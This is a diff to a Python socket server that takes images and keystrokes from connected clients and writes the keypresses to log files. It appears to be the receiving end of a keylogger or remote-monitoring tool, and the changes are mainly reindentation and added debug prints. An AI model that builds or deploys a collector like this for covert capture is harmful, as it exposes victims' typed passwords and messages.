@@ -5,7 +5,6 @@ import os
 import time
 import select
 
-
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 4000
 BUFFER_SIZE = 1024 * 128  # Buffer size for receiving data
@@ -14,7 +13,6 @@ SEPARATOR = "<sep>"
 clients = []
 client_sockets = {}
 keypress_queues = {}
-
 
 # Function to handle client messages, including image data
 def handle_client(client_socket, client_address, keypress_queue):
@@ -28,11 +26,11 @@ def handle_client(client_socket, client_address, keypress_queue):
 
     client_socket.settimeout(0.5)  # Set a timeout for the socket (non-blocking)
 
-
     while True:
         try:
             # Wait to receive the first message from the client
             data = client_socket.recv(BUFFER_SIZE).decode()
+            print(f"Received data: {data}")  # Debug print
 
             if data == "image":
                 # Prepare to receive an image
@@ -57,33 +55,32 @@ def handle_client(client_socket, client_address, keypress_queue):
                 client_socket.send("Image received".encode())  # Notify client
             else:
                 with open(file_name, 'a') as file:
-                        # Check if 5 seconds have passed since the last keypress
-                        if time.time() - last_keypress_time >= 5:
-                            if not newline_added:
-                                keypress_queue.put('\n')
-                                file.write('\n')
-                                file.flush()  # Make sure the newline is written immediately
-                                newline_added = True
+                    # Check if 5 seconds have passed since the last keypress
+                    if time.time() - last_keypress_time >= 5:
+                        if not newline_added:
+                            keypress_queue.put('\n')
+                            file.write('\n')
+                            file.flush()  # Make sure the newline is written immediately
+                            newline_added = True
 
-                        # Use select to check if data is available to read
-                        readable, _, _ = select.select([client_socket], [], [], 0)
-                        if readable:
-                            keypress = client_socket.recv(BUFFER_SIZE).decode()
-                            if not keypress:  # If no keypress (client disconnected)
-                                break
+                    # Use select to check if data is available to read
+                    readable, _, _ = select.select([client_socket], [], [], 0)
+                    if readable:
+                        keypress = client_socket.recv(BUFFER_SIZE).decode()
+                        if not keypress:  # If no keypress (client disconnected)
+                            break
 
-                            keypress_queue.put(keypress)
-                            file.write(keypress)
-                            file.flush()  # Make sure to write immediately
-                            newline_added = False  # Reset the flag when something is written
-                            last_keypress_time = time.time()  # Update the last keypress time
-                        print(f"Received message from {client_ip}: {data}")
+                        keypress_queue.put(keypress)
+                        file.write(keypress)
+                        file.flush()  # Make sure to write immediately
+                        newline_added = False  # Reset the flag when something is written
+                        last_keypress_time = time.time()  # Update the last keypress time
+                        print(f"Received keypress from {client_ip}: {keypress}")  # Debug print
         except Exception as e:
             print(f"Error handling client {client_ip}: {e}")
             break
 
     client_socket.close()
-
 
 # Function to start the server and handle incoming connections
 def start_server(update_clients_list):
@@ -103,7 +100,6 @@ def start_server(update_clients_list):
         update_clients_list(clients)
         print(f"{client_address[0]}:{client_address[1]} Connected!")
         threading.Thread(target=handle_client, args=(client_socket, client_address, keypress_queue)).start()
-
 
 # Function to stop the server and close all client connections
 def stop_server():
